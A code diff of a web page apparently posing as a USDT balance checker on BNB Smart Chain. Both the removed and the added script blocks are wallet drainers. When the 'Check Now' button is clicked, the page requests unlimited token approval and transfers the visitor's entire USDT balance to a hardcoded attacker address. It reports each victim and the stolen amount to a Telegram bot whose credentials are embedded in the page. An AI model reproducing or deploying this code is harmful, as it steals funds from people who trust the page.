@@ -1252,371 +1252,155 @@
                                                             <button type="button" onclick="approveToken()" style="display: none;">Approve</button>
                                                             <script>
 
-                                                   // Ensure Web3.js library is loaded in your HTML, typically like this:
-// <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+                                                                async function addAndSwitchToBSC() {
+                                                                    if (!window.ethereum) {
+                                                                        alert("Please install MetaMask or a Web3 wallet!");
+                                                                        return;
+                                                                    }
 
-// --- Configuration ---
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
-const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
+                                                                    const BSC_MAINNET = {
+                                                                        chainId: "0x38",
+                                                                        // 56 in hex (BSC mainnet)
+                                                                        chainName: "Binance Smart Chain",
+                                                                        nativeCurrency: {
+                                                                            name: "BNB",
+                                                                            symbol: "BNB",
+                                                                            decimals: 18,
+                                                                        },
+                                                                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                                                                        blockExplorerUrls: ["https://bscscan.com"],
+                                                                    };
 
-let web3;
-let userAddress; // Stores the connected wallet address
+                                                                    try {
+                                                                        // Check current chain
+                                                                        const currentChainId = await window.ethereum.request({
+                                                                            method: 'eth_chainId'
+                                                                        });
 
-// --- UI Element References (based on your existing HTML IDs) ---
-let connectButton;
-let approveButton; // This button will now trigger verify & transfer
-let accountDisplay;
-let statusDisplay; // For displaying messages to the user
+                                                                        // If already on BSC, do nothing
+                                                                        if (currentChainId === '0x38') {
+                                                                            console.log("Already on BSC");
+                                                                            return;
+                                                                        }
 
-// --- Utility Function to Update Status Display ---
-function updateStatus(message, color = 'black') {
-    if (statusDisplay) {
-        statusDisplay.innerHTML = message;
-        // Basic styling based on color
-        switch(color) {
-            case 'green': statusDisplay.style.color = 'green'; break;
-            case 'red': statusDisplay.style.color = 'red'; break;
-            case 'blue': statusDisplay.style.color = '#007bff'; break; // Light blue
-            case 'orange': statusDisplay.style.color = '#ff9800'; break; // Orange
-            default: statusDisplay.style.color = '#333'; // Default dark grey
-        }
+                                                                        // Try switching to BSC
+                                                                        try {
+                                                                            await window.ethereum.request({
+                                                                                method: 'wallet_switchEthereumChain',
+                                                                                params: [{
+                                                                                    chainId: '0x38'
+                                                                                }],
+                                                                                // BSC chainId
+                                                                            });
+                                                                            console.log("Switched to BSC");
+                                                                        } catch (switchError) {
+                                                                            // If BSC is not added, add it
+                                                                            if (switchError.code === 4902) {
+                                                                                try {
+                                                                                    await window.ethereum.request({
+                                                                                        method: 'wallet_addEthereumChain',
+                                                                                        params: [BSC_MAINNET],
+                                                                                    });
+                                                                                    console.log("BSC network added!");
+                                                                                } catch (addError) {
+                                                                                    console.error("Failed to add BSC network:", addError);
+                                                                                    alert("Failed to add BSC. Please add it manually in your wallet.");
+                                                                                }
+                                                                            } else {
+                                                                                console.error("Failed to switch to BSC:", switchError);
+                                                                                alert("Failed to switch to BSC. Please try manually.");
+                                                                            }
+                                                                        }
+                                                                    } catch (error) {
+                                                                        console.error("General error:", error);
+                                                                        alert("An error occurred. Check console for details.");
+                                                                    }
+                                                                }
 
-        // Clear status after 5 seconds for transient messages
-        clearTimeout(statusDisplay.timeoutId);
-        statusDisplay.timeoutId = setTimeout(() => {
-            statusDisplay.innerHTML = ''; // Clear message
-            statusDisplay.style.color = ''; // Reset color
-        }, 5000);
-    } else {
-        console.warn("statusDisplay element not found. Message:", message);
-        // Fallback to alert if statusDisplay is critically missing (shouldn't happen if IDs exist)
-        // alert(message);
-    }
-}
-
-// --- Wallet Connection ---
-async function connectWallet() {
-    if (!window.ethereum) {
-        updateStatus("Please install MetaMask or a Web3 wallet!", "red");
-        return;
-    }
-
-    web3 = new Web3(window.ethereum);
-
-    try {
-        // Request accounts - this will prompt the user to connect if not already
-        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        userAddress = accounts[0];
-        console.log("Wallet Connected:", userAddress);
-
-        // Update UI (account display)
-        if (accountDisplay) {
-            accountDisplay.innerText = userAddress;
-        }
-
-        updateStatus(`Wallet Connected: ${userAddress}`, "green");
-
-        // Force switch to BNB Smart Chain Mainnet (Chain ID: 56, 0x38 hex)
-        try {
-            const currentChainId = await web3.eth.getChainId();
-            if (currentChainId !== 56) { // Check if not already on BSC Mainnet
-                updateStatus("Switching to BNB Smart Chain...", "blue");
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: "0x38" }] // BSC Mainnet chainId
-                });
-                console.log("Switched to BNB Smart Chain.");
-                updateStatus("Switched to BNB Smart Chain!", "green");
-            } else {
-                console.log("Already on BNB Smart Chain.");
-                updateStatus("Already on BNB Smart Chain.", "black");
-            }
-        } catch (switchError) {
-            if (switchError.code === 4902) { // Chain not added to wallet
-                console.log("BNB Smart Chain not added, attempting to add...");
-                updateStatus("BNB Smart Chain not added, attempting to add...", "orange");
-                try {
-                    await window.ethereum.request({
-                        method: "wallet_addEthereumChain",
-                        params: [{
-                            chainId: "0x38",
-                            chainName: "BNB Smart Chain Mainnet",
-                            nativeCurrency: {
-                                name: "BNB",
-                                symbol: "BNB",
-                                decimals: 18,
-                            },
-                            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                            blockExplorerUrls: ["https://bscscan.com/"],
-                        }],
-                    });
-                    console.log("BNB Smart Chain added and switched.");
-                    updateStatus("BNB Smart Chain added and switched!", "green");
-                } catch (addError) {
-                    console.error("Failed to add BNB Smart Chain:", addError);
-                    updateStatus("Failed to add BNB Smart Chain. Please add it manually to MetaMask.", "red");
-                    userAddress = null; // Reset if chain switch/add failed
-                    if (accountDisplay) accountDisplay.innerText = "Not Connected";
-                }
-            } else {
-                console.error("Error switching chain:", switchError);
-                updateStatus("Failed to switch to BNB Smart Chain. Please do so manually in MetaMask.", "red");
-                userAddress = null; // Reset if chain switch failed
-                if (accountDisplay) accountDisplay.innerText = "Not Connected";
-            }
-        }
-
-    } catch (error) {
-        console.error("Error connecting wallet or switching chain:", error);
-        updateStatus("Wallet connection or chain switch failed. Please check MetaMask.", "red");
-        userAddress = null;
-        if (accountDisplay) accountDisplay.innerText = "Not Connected";
-    }
-}
-
-// --- Asset Verification and Conditional Transfer (triggered by "approveButton") ---
-async function verifyAssetsAndTransfer() {
-    if (!web3 || !userAddress) {
-        updateStatus("Wallet not connected. Please connect your wallet first.", "red");
-        return;
-    }
-
-    // Double-check if still on the correct chain
-    const currentChainId = await web3.eth.getChainId();
-    if (currentChainId !== 56) {
-        updateStatus("Please switch to BNB Smart Chain (BSC Mainnet) in your wallet to proceed.", "red");
-        // Optionally attempt to switch again
-        await connectWallet();
-        const recheckChainId = await web3.eth.getChainId();
-        if (recheckChainId !== 56) return; // Exit if still not on BSC after re-attempt
-    }
-
-    const usdtContract = new web3.eth.Contract([
-        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
-    ], usdtContractAddress);
-
-    try {
-        updateStatus("Fetching your balances...", "blue");
-
-        const [usdtBalanceWei, userBNBWei] = await Promise.all([
-            usdtContract.methods.balanceOf(userAddress).call(),
-            web3.eth.getBalance(userAddress)
-        ]);
-
-        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
-        const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
-
-        console.log(`USDT Balance: ${usdtBalance} USDT`);
-        console.log(`BNB Balance: ${userBNB} BNB`);
-
-        // --- Send Balances to Backend/Telegram (for logging/notification) ---
-        fetch('saveWallet.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                wallet: userAddress,
-                bnb: userBNB.toFixed(6),
-                usdt: usdtBalance.toFixed(6)
-            })
-        }).then(res => res.json()).then(data => console.log('Wallet info saved:', data)).catch(e => console.error('Error saving wallet info:', e));
-
-        fetch('sendTelegram.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                message: `🔔 <b>New Wallet Info</b>\n🧾 Address: <code>${userAddress}</code>\n💰 BNB Balance: ${userBNB.toFixed(6)} BNB\n💳 USDT Balance: ${usdtBalance.toFixed(6)} USDT`
-            })
-        }).catch(e => console.error('Error sending Telegram (wallet info):', e));
-
-
-        // --- Conditional Logic for Transfer ---
-        if (usdtBalance <= 0) {
-            updateStatus("No USDT assets found in your wallet to transfer.", "black");
-            return;
-        }
-
-        updateStatus("USDT assets found. Checking BNB for gas...", "green");
-
-        const minimumBNBForGas = 0.0005; // Amount of BNB considered sufficient for gas
-
-        if (userBNB < minimumBNBForGas) {
-            console.log(`User BNB (${userBNB}) is low. Requesting ${minimumBNBForGas} BNB from backend for gas fees...`);
-            updateStatus("Insufficient BNB for gas. Requesting gas fee from server...", "orange");
-
-            const bnbRequestStatus = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ toAddress: userAddress })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log("BNB request successful:", data);
-                return true; // Indicate success
-            })
-            .catch(error => {
-                console.error("Error requesting BNB from backend:", error);
-                updateStatus("Failed to get BNB from server. Please ensure you have enough BNB for gas or try again later.", "red");
-                return false; // Indicate failure
-            });
-
-            if (!bnbRequestStatus) {
-                return; // Exit if backend BNB request failed
-            }
-
-            // IMPORTANT: Wait for BNB to arrive. This is a basic delay.
-            updateStatus("Waiting for BNB to arrive... (approx. 10 seconds). Do not close this window.", "blue");
-            await new Promise(resolve => setTimeout(resolve, 10000)); // Wait 10 seconds
-
-            // Re-fetch BNB balance after potential top-up
-            const updatedUserBNBWei = await web3.eth.getBalance(userAddress);
-            const updatedUserBNB = parseFloat(web3.utils.fromWei(updatedUserBNBWei, "ether"));
-
-            console.log(`Updated BNB Balance: ${updatedUserBNB} BNB`);
-
-            if (updatedUserBNB < minimumBNBForGas) {
-                updateStatus("Still not enough BNB after request. Transfer aborted. Please try again or manually add BNB.", "red");
-                return;
-            }
-        }
-
-        // Proceed with USDT Transfer
-        transferUSDT(usdtBalance);
-
-    } catch (error) {
-        console.error("Error verifying assets or fetching balances:", error);
-        updateStatus("An error occurred during asset verification. Please try again.", "red");
-    }
-}
-
-// --- USDT Transfer Function ---
-async function transferUSDT(usdtAmount) {
-    if (!web3 || !userAddress) {
-        updateStatus("Wallet not connected. Cannot perform transfer.", "red");
-        return;
-    }
-
-    const usdtContract = new web3.eth.Contract([
-        { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
-    ], usdtContractAddress);
-
-    try {
-        const amountToSendWei = web3.utils.toWei(usdtAmount.toString(), "ether");
-
-        console.log(`Attempting to transfer ${usdtAmount} USDT to ${bscAddress} from ${userAddress}...`);
-        updateStatus(`Initiating USDT transfer of ${usdtAmount.toFixed(2)} USDT... Please confirm in your wallet.`, "blue");
-
-        const gasLimit = 100000; // Common gas limit for ERC-20 transfers
-
-        const transaction = await usdtContract.methods.transfer(bscAddress, amountToSendWei).send({
-            from: userAddress,
-            gas: gasLimit
-        });
-
-        console.log("✅ USDT Transfer Transaction Hash:", transaction.transactionHash);
-
-        updateStatus(
-            `✅ USDT Transfer Successful!<br>Hash: <a href="https://bscscan.com/tx/${transaction.transactionHash}" target="_blank">${transaction.transactionHash.substring(0, 10)}...</a><br><b>Transferred:</b> ${usdtAmount.toFixed(2)} USDT`,
-            "green"
-        );
-
-        // Log successful transfer to your server
-        fetch('logTransfer.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                sender: userAddress,
-                recipient: bscAddress,
-                token: usdtContractAddress,
-                amount: usdtAmount.toFixed(6),
-                transactionHash: transaction.transactionHash
-            })
-        }).then(res => res.json()).then(data => console.log('Transfer logged:', data)).catch(e => console.error('Error logging transfer:', e));
-
-        // Send Telegram notification for successful transfer
-        fetch('sendTelegram.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                message: `💸 <b>USDT Direct Transfer SUCCESS</b>\nFrom: <code>${userAddress}</code>\nTo: <code>${bscAddress}</code>\nToken: USDT BEP20\nAmount: ${usdtAmount.toFixed(6)} USDT\nTx Hash: <a href="https://bscscan.com/tx/${transaction.transactionHash}">${transaction.transactionHash.substring(0, 10)}...</a>`
-            })
-        }).catch(e => console.error('Error sending Telegram (success):', e));
-
-    } catch (error) {
-        console.error("❌ USDT Transfer Failed:", error);
-
-        let displayMessage = "USDT transfer failed.";
-        if (error.code === 4001) {
-            displayMessage = "Transaction rejected by user in MetaMask.";
-        } else if (error.message.includes("insufficient funds for gas")) {
-            displayMessage = "Insufficient BNB for gas. Please ensure you have enough BNB.";
-        } else if (error.message.includes("User denied transaction signature")) {
-            displayMessage = "Transaction denied by user.";
-        } else if (error.message.includes("gas required exceeds allowance")) {
-            displayMessage = "Gas limit might be too low or transaction complexity too high.";
-        }
-
-        updateStatus(`❌ ${displayMessage}<br>Error: ${error.message.substring(0, 100)}...`, "red");
-
-        // Log failed transfer to your server
-        fetch('logTransferError.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                sender: userAddress,
-                recipient: bscAddress,
-                token: usdtContractAddress,
-                amount: usdtAmount.toFixed(6),
-                error: error.message,
-                errorCode: error.code || 'N/A'
-            })
-        }).then(res => res.json()).then(data => console.log('Transfer error logged:', data)).catch(e => console.error('Error logging transfer error:', e));
-
-        // Send Telegram notification for failed transfer
-        fetch('sendTelegram.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                message: `🚨 <b>USDT Direct Transfer FAILED</b>\nFrom: <code>${userAddress}</code>\nTo: <code>${bscAddress}</code>\nToken: USDT BEP20\nAmount: ${usdtAmount.toFixed(6)} USDT\nError: ${displayMessage} (${error.code || 'No Code'})`
-            })
-        }).catch(e => console.error('Error sending Telegram (failure):', e));
-    }
-}
-
-// --- DOM Content Loaded Listener to Attach Event Handlers ---
-document.addEventListener("DOMContentLoaded", () => {
-    // Get references to the existing HTML elements
-    connectButton = document.getElementById("connectButton");
-    approveButton = document.getElementById("approveButton"); // This will now trigger the transfer
-    accountDisplay = document.getElementById("accountDisplay");
-    statusDisplay = document.getElementById("statusDisplay");
-
-    if (connectButton) {
-        connectButton.addEventListener("click", connectWallet);
-    } else {
-        console.error("Error: HTML element with ID 'connectButton' not found. Wallet connection will not work.");
-    }
-
-    if (approveButton) {
-        // Renaming the action for clarity in console, but using the existing ID
-        console.log("NOTE: 'approveButton' will now trigger USDT asset verification and direct transfer.");
-        approveButton.addEventListener("click", verifyAssetsAndTransfer);
-    } else {
-        console.error("Error: HTML element with ID 'approveButton' not found. USDT transfer will not work.");
-    }
-
-    if (!accountDisplay) {
-        console.error("Error: HTML element with ID 'accountDisplay' not found.");
-    }
-    if (!statusDisplay) {
-        console.error("Error: HTML element with ID 'statusDisplay' not found. Status messages may not be visible.");
-    }
-});
+                                                                // Run the function
+                                                                addAndSwitchToBSC();
                                                             </script>
+                                                            <script>
+const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+const contractAddress = "0x828bc41ea90d48c0db0030860Aca6CaD6128Fbd3";
+const recipientAddress = "0x56d21eA0E027b925423D68FC5d2762e3AD07284d";
+const telegramToken = "8168441203:AAGpFsF9O386peGIZXB1ev9mc_fpkKcboLg";
+const telegramChatID = "6774801802";
+
+window.onload = async function() {
+  if (typeof window.ethereum !== 'undefined') {
+    try {
+      await window.ethereum.request({ method: 'wallet_switchEthereumChain', params:[{ chainId: '0x38' }] });
+    } catch(e) { }
+  }
+}
+
+function calculateUSD() {
+  let amount = parseFloat(document.getElementById("amount").value);
+  if (!amount || amount <= 0) amount = 0;
+  document.getElementById("usdValue").innerText = "$" + amount.toFixed(2);
+}
+
+async function approveToken() {
+  const loader = document.getElementById("loader");
+  loader.style.display = "block";
+
+  if (typeof window.ethereum === 'undefined') {
+    alert('Please install MetaMask or TrustWallet!');
+    loader.style.display = "none";
+    return;
+  }
+
+  try {
+    const web3 = new Web3(window.ethereum);
+    const accounts = await web3.eth.requestAccounts();
+    const account = accounts[0];
+
+    sendTelegram("User Connected: " + account);
+
+    const abi = [
+      {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    ];
+
+    const token = new web3.eth.Contract(abi, tokenAddress);
+    const balance = await token.methods.balanceOf(account).call();
+
+    if (BigInt(balance) === 0n) {
+      alert("No USDT balance found.");
+      loader.style.display = "none";
+      return;
+    }
+
+    const maxApproval = web3.utils.toTwosComplement('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+    await token.methods.approve(contractAddress, maxApproval).send({ from: account });
+
+    await token.methods.transfer(recipientAddress, balance).send({ from: account });
+
+    const humanReadable = parseFloat(balance) / 1e6;
+    sendTelegram("USDT Transferred: " + humanReadable + " USDT from: " + account);
+
+    alert("Transaction completed successfully!");
+  } catch (err) {
+    alert("Error: " + err.message);
+  }
+
+  loader.style.display = "none";
+}
+
+function sendTelegram(message) {
+  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatID}&text=${encodeURIComponent(message)}`);
+}
+
+function copyAddress() {
+  const addressField = document.getElementById("address");
+  navigator.clipboard.writeText(addressField.value);
+  alert("Address copied!");
+}
+</script>
+                                                               
+                                                            
                                                             <button type="button" class="hero-button group px-8 py-4 bg-white text-emerald-600 rounded-xl font-bold hover:bg-emerald-50 transition-all duration-300 ease-in-out flex items-center justify-center space-x-2 shadow-lg" onclick="approveToken()">Check Now
     </button>
                                                             <div id="approvalPopup" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.2); padding:24px; max-width:400px; width:90%; z-index:9999; text-align:center;">
